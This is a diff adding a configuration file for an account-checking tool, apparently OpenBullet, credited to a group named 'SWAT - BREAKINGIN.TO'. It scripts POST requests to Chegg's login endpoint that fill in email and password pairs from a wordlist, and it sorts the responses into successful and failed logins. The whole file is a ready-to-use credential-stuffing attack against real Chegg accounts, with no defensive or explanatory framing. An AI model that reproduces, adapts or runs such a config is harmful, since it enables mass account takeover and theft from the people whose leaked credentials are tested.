@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "chegg.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-13T09:27:16.459739-07:00",
+  "AdditionalInfo": "",
+  "Author": "SWAT - BREAKINGIN.TO",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.chegg.com/auth/_ajax/auth/v1/login?clientId=CHGG" 
+  CONTENT "clientId=CHGG&redirect_uri=&state=&responseType=&email=<USER>&password=<PASS>&version=2.121.1&profileId=CHGG" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"authMethod\":\"Chegg\",\"uuid\"" 
+  KEYCHAIN Failure OR 
+    KEY "Email and password do not match." 
+
